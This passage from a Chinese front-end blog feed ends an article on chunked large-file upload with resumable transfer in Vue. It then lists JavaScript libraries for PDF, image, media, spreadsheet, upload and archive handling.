class="line">    <span class="keyword">const</span> loaded = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">      .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">size</span> * item.<span class="property">percentage</span>)</span><br><span class="line">      .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((loaded / <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">size</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,  </span><br><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">      <span class="title function_">uploadPercentage</span>(<span class="params">now</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (now &gt; <span class="variable language_">this</span>.<span class="property">fakeUploadPercentage</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">fakeUploadPercentage</span> = now;</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当 uploadPercentage 即真的文件进度条增加时，fakeUploadPercentage 也增加，一旦文件进度条后退，假的进度条只需停止即可<br />至此一个大文件上传 + 断点续传的解决方案就完成了<br><a name="93wr5"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大文件上传</p><ul><li>前端上传大文件时使用 Blob.prototype.slice 将文件切片，并发上传多个切片，最后发送一个合并的请求通知服务端合并切片</li><li>服务端接收切片并存储，收到合并请求后使用流将切片合并到最终文件</li><li>原生 XMLHttpRequest 的 upload.onprogress 对切片上传进度的监听</li><li>使用 Vue 计算属性根据每个切片的进度算出整个文件的上传进度</li></ul><p>断点续传</p><ul><li>使用 spark-md5 根据文件内容算出文件 hash</li><li>通过 hash 可以判断服务端是否已经上传该文件，从而直接提示用户上传成功（秒传）</li><li>通过 XMLHttpRequest 的 abort 方法暂停切片的上传</li><li>上传前服务端返回已经上传的切片名，前端跳过这些切片的上传<br><a name="tYWqU"></a></li></ul><h1 id="反馈的问题"><a href="#反馈的问题" class="headerlink" title="反馈的问题"></a>反馈的问题</h1><p>部分功能由于不方便测试，这里列出评论区收集到的一些问题，有兴趣的朋友可以提出你的想法&#x2F;写个 demo 进一步交流</p><ul><li>没有做切片上传失败的处理</li><li>使用 web socket 由服务端发送进度信息</li><li>打开页面没有自动获取上传切片，而需要主动再次上传一次后才显示<br><a name="vczKu"></a></li></ul><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>源代码增加了一些按钮的状态，交互更加友好，文章表达比较晦涩的地方可以跳转到源代码查看<br /><a href="https://github.com/yeyan1996/file-upload">file-upload</a></p><p><a name="toFhM"></a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://juejin.im/post/5da14778f265da5bb628e590">写给新手前端的各种文件上传攻略，从小图片到大文件断点续传</a><br /><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob/slice">Blob.slice</a></p><p><a href="https://juejin.im/post/5dff8a26e51d4558105420ed">https://juejin.im/post/5dff8a26e51d4558105420ed</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 大文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件处理库</title>
      <link href="/2022/02/19/frontend/collection/wheel/wen-jian-chu-li-ku/"/>
      <url>/2022/02/19/frontend/collection/wheel/wen-jian-chu-li-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475987133-286486e5-844e-4459-b79b-f49d1cba4619.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475987133-286486e5-844e-4459-b79b-f49d1cba4619.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="SCtXi"></a></p><h1 id="1-PDF"><a href="#1-PDF" class="headerlink" title="1. PDF"></a>1. PDF</h1><p><a name="bgIJx"></a></p><h2 id="（1）PDF-js"><a href="#（1）PDF-js" class="headerlink" title="（1）PDF.js"></a>（1）PDF.js</h2><p>PDF.js是使用 HTML5 构建的可移植文档格式 (PDF) 查看器。它由社区驱动并受 Mozilla 支持，目标是创建一个通用的、基于 Web 标准的平台来解析和呈现 PDF。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657462054009-7480ac84-c28e-4909-8bc9-b68eb38206ad.png?x-oss-process=image/resize,w_886,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657462054009-7480ac84-c28e-4909-8bc9-b68eb38206ad.png?x-oss-process=image/resize,w_886,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="R5YQW"></a></p><h2 id="（2）jsPDF"><a href="#（2）jsPDF" class="headerlink" title="（2）jsPDF"></a>（2）jsPDF</h2><p>jsPDF 是一个使用 JavaScript 语言生成 PDF 的开源库，是一个用于生成 PDF 的领先的 HTML5 客户端解决方案。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657462911906-fe4483d1-dde4-416b-b7f0-4cb6b69c4b41.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657462911906-fe4483d1-dde4-416b-b7f0-4cb6b69c4b41.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="XMA9o"></a></p><h2 id="（3）pdfmake"><a href="#（3）pdfmake" class="headerlink" title="（3）pdfmake"></a>（3）pdfmake</h2><p>在纯 JavaScript 中用于服务器端和客户端的 PDF 文档生成库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657463503527-9a884951-1607-41ab-abb2-d2e771d67685.png?x-oss-process=image/resize,w_883,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657463503527-9a884951-1607-41ab-abb2-d2e771d67685.png?x-oss-process=image/resize,w_883,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="fOlFT"></a></p><h2 id="（4）pdf-lib"><a href="#（4）pdf-lib" class="headerlink" title="（4）pdf-lib"></a>（4）pdf-lib</h2><p>pdf-lib 可以在任何 JavaScript 环境中创建和修改 PDF 文档。它旨在解决 JavaScript 生态系统对 PDF 操作（尤其是 PDF修改）缺乏强大支持的问题。可以用于任何现代 JavaScript 运行时，如 Node、Browser、Deno 和 React Native 等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657464689492-3b177db2-cee9-41d6-8ffc-8bd2b44a2cd1.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657464689492-3b177db2-cee9-41d6-8ffc-8bd2b44a2cd1.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="PhJsV"></a></p><h2 id="（5）pdfkit"><a href="#（5）pdfkit" class="headerlink" title="（5）pdfkit"></a>（5）pdfkit</h2><p>PDFKit 是一个用于 Node 和浏览器的 PDF 文档生成库，可以轻松创建复杂的多页可打印文档。API 包含可链接性，并包括低级功能以及更高级别功能的抽象。PDFKit API 的设计很简单，因此生成复杂的文档通常只需几个函数调用即可。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657466430038-5ca36f4e-4545-4170-ac1c-444ec2a64178.png?x-oss-process=image/resize,w_884,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657466430038-5ca36f4e-4545-4170-ac1c-444ec2a64178.png?x-oss-process=image/resize,w_884,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="cCWP1"></a></p><h2 id="（6）react-pdf"><a href="#（6）react-pdf" class="headerlink" title="（6）react-pdf"></a>（6）react-pdf</h2><p>react-pdf 是一个用于在浏览器和服务器上创建 PDF 文件的 React 渲染器。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657466736878-9b0118ac-e15c-4b26-b1ba-f0cb6a1acb17.png?x-oss-process=image/resize,w_889,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657466736878-9b0118ac-e15c-4b26-b1ba-f0cb6a1acb17.png?x-oss-process=image/resize,w_889,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="USiuc"></a></p><h1 id="2-图片"><a href="#2-图片" class="headerlink" title="2. 图片"></a>2. 图片</h1><p><a name="vRH4Y"></a></p><h2 id="（1）sharp"><a href="#（1）sharp" class="headerlink" title="（1）sharp"></a>（1）sharp</h2><p>sharp 是一个高性能的 Node.js 图像处理库，调整 JPEG、PNG、WebP、AVIF 和 TIFF 图像大小的最快模块。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657467735827-7527b2f3-8471-4c97-a84c-1900fd3ef594.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657467735827-7527b2f3-8471-4c97-a84c-1900fd3ef594.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="Wuc0D"></a></p><h2 id="（2）cropperjs"><a href="#（2）cropperjs" class="headerlink" title="（2）cropperjs"></a>（2）cropperjs</h2><p>cropperjs 是一个 JavaScript 图像裁剪器，支持29个裁剪选项、27种方法、6个事件、缩放、旋转等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657467979410-53c12b48-bdfb-4257-a409-5fe0f1e2cb8a.png?x-oss-process=image/resize,w_762,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657467979410-53c12b48-bdfb-4257-a409-5fe0f1e2cb8a.png?x-oss-process=image/resize,w_762,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="COSjr"></a></p><h2 id="（3）tui-image-editor"><a href="#（3）tui-image-editor" class="headerlink" title="（3）tui.image-editor"></a>（3）tui.image-editor</h2><p>tui.image-editor 是一个使用 HTML5 Canvas 的全功能图像编辑器。它易于使用并提供强大的过滤器。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657470118701-f578d232-862e-4979-8f85-2127f5ed383e.png?x-oss-process=image/resize,w_785,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657470118701-f578d232-862e-4979-8f85-2127f5ed383e.png?x-oss-process=image/resize,w_785,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="UpEt9"></a></p><h2 id="（4）compressorjs"><a href="#（4）compressorjs" class="headerlink" title="（4）compressorjs"></a>（4）compressorjs</h2><p>JavaScript 图像压缩器。使用浏览器原生的 canvas.toBlob API 来做压缩工作，即<strong>有损压缩</strong>，<strong>异步</strong>压缩，在不同的浏览器有<strong>不同的压缩效果</strong>。一般在客户端上传之前使用这个来预压缩图片。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657470473998-eef98daf-f592-48ef-a6df-7a61faf1b993.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657470473998-eef98daf-f592-48ef-a6df-7a61faf1b993.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="RIzaU"></a></p><h2 id="（5）viewerjs"><a href="#（5）viewerjs" class="headerlink" title="（5）viewerjs"></a>（5）viewerjs</h2><p>viewerjs 是一个 JavaScript 图像查看器，支持52个查看选项、23种操作方法、17个事件、旋转、移动、缩放等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657470620499-aabeb917-4a5e-4c94-ab74-6a3138c504f1.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657470620499-aabeb917-4a5e-4c94-ab74-6a3138c504f1.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="sndoJ"></a></p><h2 id="（6）omagesloaded"><a href="#（6）omagesloaded" class="headerlink" title="（6）omagesloaded"></a>（6）omagesloaded</h2><p>omagesloaded 是一个用来检查图像何时加载的 JavaScript 库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657471110588-c5c5e359-f553-46c4-b4f2-1835344fc9ef.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657471110588-c5c5e359-f553-46c4-b4f2-1835344fc9ef.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="jP85V"></a></p><h1 id="3-音视频"><a href="#3-音视频" class="headerlink" title="3. 音视频"></a>3. 音视频</h1><p><a name="pjgYP"></a></p><h2 id="（1）video-js"><a href="#（1）video-js" class="headerlink" title="（1）video.js"></a>（1）video.js</h2><p>Video.js 是一个为 HTML5 世界从头开始构建的网络视频播放器。它支持 HTML5 视频和媒体源扩展，以及其他播放技术，如 YouTube 和 Vimeo（通过插件）。它支持在台式机和移动设备上播放视频。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657471942627-408eba4b-d082-471a-b3b4-f0efacb7f8cd.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657471942627-408eba4b-d082-471a-b3b4-f0efacb7f8cd.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="Fr7fR"></a></p><h2 id="（2）plyr"><a href="#（2）plyr" class="headerlink" title="（2）plyr"></a>（2）plyr</h2><p>Plyr 是一个简单、轻量级、可访问和可定制的 HTML5、YouTube 和 Vimeo 媒体播放器，支持现代浏览器。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657472049651-78b61867-72c5-4c3a-87ce-ec90030b6ea9.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657472049651-78b61867-72c5-4c3a-87ce-ec90030b6ea9.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="XricI"></a></p><h2 id="（3）MediaElement-js"><a href="#（3）MediaElement-js" class="headerlink" title="（3）MediaElement.js"></a>（3）MediaElement.js</h2><p>MediaElement.js 是一个HTML5 <audio> 或 <video> 播放器，支持 MP4、WebM 和 MP3 以及 HLS、Dash、YouTube、Facebook、SoundCloud 等，具有通用 HTML5 MediaElement API，可在所有浏览器中实现一致的 UI。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657474380271-9f1985bd-8b0d-4c1e-835c-475e07e645ff.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657474380271-9f1985bd-8b0d-4c1e-835c-475e07e645ff.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="Mg1IY"></a></p><h2 id="（4）xgplayer"><a href="#（4）xgplayer" class="headerlink" title="（4）xgplayer"></a>（4）xgplayer</h2><p>西瓜播放器是一个Web视频播放器类库，它本着一切都是组件化的原则设计了独立可拆卸的 UI 组件。更重要的是它不只是在 UI 层有灵活的表现，在功能上也做了大胆的尝试：摆脱视频加载、缓冲、格式支持对 video 的依赖。尤其是在 mp4 点播上做了较大的努力，让本不支持流式播放的 mp4 能做到分段加载，这就意味着可以做到清晰度无缝切换、加载控制、节省视频流量。同时，它也集成了对 flv、hls、dash 的点播和直播支持。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657474785135-58850b84-8d64-4369-bec6-e8fad6a12324.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657474785135-58850b84-8d64-4369-bec6-e8fad6a12324.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="ahc2Y"></a></p><h2 id="（5）DPlayer"><a href="#（5）DPlayer" class="headerlink" title="（5）DPlayer"></a>（5）DPlayer</h2><p>DPlayer 是一款可爱的 HTML5 弹幕视频播放器，可帮助人们轻松构建视频和弹幕。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475030777-0158c4ce-8b7f-47ec-8ced-c6b42c886561.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475030777-0158c4ce-8b7f-47ec-8ced-c6b42c886561.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="oGCb6"></a></p><h2 id="（6）Howler-js"><a href="#（6）Howler-js" class="headerlink" title="（6）Howler.js"></a>（6）Howler.js</h2><p>howler.js 是一个现代 web 音频库。它默认为Web Audio API并回退到HTML5 Audio。这使得在所有平台上使用 JavaScript 处理音频变得容易且可靠。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475185845-b716fd84-288a-4d30-b6b0-a25d414e0470.png?x-oss-process=image/resize,w_825,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475185845-b716fd84-288a-4d30-b6b0-a25d414e0470.png?x-oss-process=image/resize,w_825,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="tGLJ3"></a></p><h1 id="4-表格"><a href="#4-表格" class="headerlink" title="4. 表格"></a>4. 表格</h1><p><a name="TECiK"></a></p><h2 id="（1）Handsontable"><a href="#（1）Handsontable" class="headerlink" title="（1）Handsontable"></a>（1）Handsontable</h2><p>Handsontable 是一个具有电子表格外观的 JavaScript 数据网格组件。适用于 React、Angular 和 Vue。它结合了数据网格功能和类似电子表格的 UX。它提供数据绑定、数据验证、过滤、排序和 CRUD 操作。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475321627-76340bd7-4945-4ed6-b264-1d21407149e2.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475321627-76340bd7-4945-4ed6-b264-1d21407149e2.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="hxqQt"></a></p><h2 id="（2）ag-grid"><a href="#（2）ag-grid" class="headerlink" title="（2）ag-grid"></a>（2）ag-grid</h2><p>AG Grid 是一个功能齐全且高度可定制的 JavaScript 数据网格。它提供了出色的性能，没有第三方依赖，并且可以与所有主要的 JavaScript 框架顺利集成。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475416320-cda2c2fb-dc15-4e43-b2b8-964da68955ab.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657475416320-cda2c2fb-dc15-4e43-b2b8-964da68955ab.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="hGmxF"></a></p><h2 id="（3）x-spreadsheet"><a href="#（3）x-spreadsheet" class="headerlink" title="（3）x-spreadsheet"></a>（3）x-spreadsheet</h2><p>x-spreadsheet 是一个基于 Web 的 JavaScript（canvas）电子表格。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476078361-e291876e-157f-4d5c-a230-47a6c867dcc0.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476078361-e291876e-157f-4d5c-a230-47a6c867dcc0.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="pM7eq"></a></p><h2 id="（4）cheetah-grid"><a href="#（4）cheetah-grid" class="headerlink" title="（4）cheetah-grid"></a>（4）cheetah-grid</h2><p>cheetah-grid 是最快的 Web 开源数据表。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476161536-3abbcc9b-40ec-4330-83a3-dbc662f172fe.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476161536-3abbcc9b-40ec-4330-83a3-dbc662f172fe.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="wM1Y9"></a></p><h2 id="（5）ExcelJS"><a href="#（5）ExcelJS" class="headerlink" title="（5）ExcelJS"></a>（5）ExcelJS</h2><p>ExcelJS 是一个Excel电子表格文件逆向工程项目。可以读取，操作并写入电子表格数据和样式到 XLSX 和 JSON 文件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476349708-5d038e35-8c1d-4726-a4a6-0d3daec3766f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476349708-5d038e35-8c1d-4726-a4a6-0d3daec3766f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="TILeH"></a></p><h2 id="（6）SheetJS"><a href="#（6）SheetJS" class="headerlink" title="（6）SheetJS"></a>（6）SheetJS</h2><p>SheetJS 是一个简化的电子表格，用意用来阅读、编辑和导出电子表格，其适用于 Web 浏览器和服务器，在 Office 365 中受 Microsoft 信任。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476602182-8862bc28-5862-42bb-b917-cfc188e0eec9.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476602182-8862bc28-5862-42bb-b917-cfc188e0eec9.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="hBUZq"></a></p><h1 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h1><p><a name="lEYA1"></a></p><h2 id="（1）Uppy"><a href="#（1）Uppy" class="headerlink" title="（1）Uppy"></a>（1）Uppy</h2><p>Uppy 是一款时尚的模块化 JavaScript 文件上传器，可与任何应用程序无缝集成。它速度快，具有易于理解的 API，让您不必担心比构建文件上传器更重要的问题。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476760136-38d64640-c83e-469b-98c0-8ebaf58a40f0.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476760136-38d64640-c83e-469b-98c0-8ebaf58a40f0.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="hsOOV"></a></p><h2 id="（2）filepond"><a href="#（2）filepond" class="headerlink" title="（2）filepond"></a>（2）filepond</h2><p>filepond 是一个用于上传文件的 JavaScript 库，优化图像以加快上传速度，并提供出色、可访问、如丝般流畅的用户体验。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476974714-7f19e9ea-26e2-4935-a857-aafb7eff4848.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657476974714-7f19e9ea-26e2-4935-a857-aafb7eff4848.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="lSr89"></a></p><h2 id="（3）Dropzone"><a href="#（3）Dropzone" class="headerlink" title="（3）Dropzone"></a>（3）Dropzone</h2><p>Dropzone 是一个 JavaScript 库，可以将任何 HTML 元素转换为 dropzone。这意味着用户可以将文件拖放到上面，Dropzone 将显示文件预览和上传进度，并通过 XHR 为你处理上传。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477025569-e6733b01-7842-4a1e-a9cb-02b6515ff278.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477025569-e6733b01-7842-4a1e-a9cb-02b6515ff278.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="NrCXI"></a></p><h2 id="（4）vue-upload-component"><a href="#（4）vue-upload-component" class="headerlink" title="（4）vue-upload-component"></a>（4）vue-upload-component</h2><p>vue-upload-component 是一个用于 Vue.js 的上传组件，支持多文件上传，上传目录，拖拽上传，拖拽目录，以及支持同时上传多个文件等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477195745-7a45c682-dbc4-46e7-a100-9b572e0b4148.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477195745-7a45c682-dbc4-46e7-a100-9b572e0b4148.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="i3uNl"></a></p><h2 id="（5）Uppload"><a href="#（5）Uppload" class="headerlink" title="（5）Uppload"></a>（5）Uppload</h2><p>Uppload 是一个更好的 JavaScript 图片上传器。它具有 30 多个插件的高度可定制性，完全免费和开源，并且可以与任何文件上传后端一起使用。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477331697-b633a214-5304-446a-a921-2c5f94ba08c7.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477331697-b633a214-5304-446a-a921-2c5f94ba08c7.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="VHo89"></a></p><h2 id="（6）react-dropzone"><a href="#（6）react-dropzone" class="headerlink" title="（6）react-dropzone"></a>（6）react-dropzone</h2><p>react-dropzone 是一个为 React 量身定制的，基于HTML5 的 drop &amp;&amp; drag API，可以实现拖拽上传文件的 JavaScript 库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477486722-9616e88f-0889-4512-bbe4-703fd462f74b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477486722-9616e88f-0889-4512-bbe4-703fd462f74b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="kdKSz"></a></p><h1 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h1><p><a name="aCKIb"></a></p><h2 id="（1）JSZip"><a href="#（1）JSZip" class="headerlink" title="（1）JSZip"></a>（1）JSZip</h2><p>JSZip 是一个使用 JavaScript 创建、读取和编辑 .zip 文件的库，具有可爱而简单的 API。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477589748-3d6503c3-d76f-44c4-9f3a-0c15b1a6d28c.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477589748-3d6503c3-d76f-44c4-9f3a-0c15b1a6d28c.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="OidiE"></a></p><h2 id="（2）docxtemplater"><a href="#（2）docxtemplater" class="headerlink" title="（2）docxtemplater"></a>（2）docxtemplater</h2><p>docxtemplater 是一个从 docx&#x2F;pptx 模板生成 docx&#x2F;pptx 文档的库。它可以用数据替换 {placeholders} 并且还支持循环和条件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477829197-4b9a5388-8966-4e34-a492-f15bc4816485.png?x-oss-process=image/resize,w_882,limit_0" class="lazyload placeholder" 